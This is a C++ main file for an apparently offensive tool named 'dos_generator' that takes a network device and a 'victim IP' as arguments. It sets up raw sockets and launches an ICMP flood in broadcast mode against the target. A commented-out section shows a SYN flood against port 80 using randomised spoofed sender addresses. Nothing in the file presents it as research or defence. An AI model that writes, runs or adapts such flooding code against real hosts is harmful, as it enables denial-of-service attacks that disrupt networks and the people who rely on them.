#include <iostream>
#include "dosgenerator.h"

using namespace std;

void usage()
{
    cout<<"Usage : dos_generator <dev> <victim IP> "<<endl;
    exit(1);
}
int main(int argc, char* argv[])
{
    //TODO : make glog class and remain logs.

    if(argc != 3) usage();

    IcmpFlood icmpFlood;


    icmpFlood.raw_init(IPPROTO_RAW);

    icmpFlood.target_ip_= argv[2];
//    icmpFlood.sender_ip_ = "192.168.0.7";

    icmpFlood.init_iph(icmpFlood.sender_ip_,icmpFlood.target_ip_,IPPROTO_ICMP);
    icmpFlood.init_icmph();

    icmpFlood.generate(ICMP_SEND_BROADCAST,'c');

    /* Syn Flooding example
    SynFlood synFlood;

    synFlood.raw_init();

    //set target ip to argv[2]
    synFlood.target_ip_=argv[2];
    //set sender ip random
    synFlood.sender_ip_.set_rand_ip();

    //set ip header
    synFlood.init_iph(synFlood.sender_ip_,synFlood.target_ip_,IPPROTO_TCP);
    synFlood.init_tcph(1234,80);


    synFlood.generate();

    */
    return 0;
}
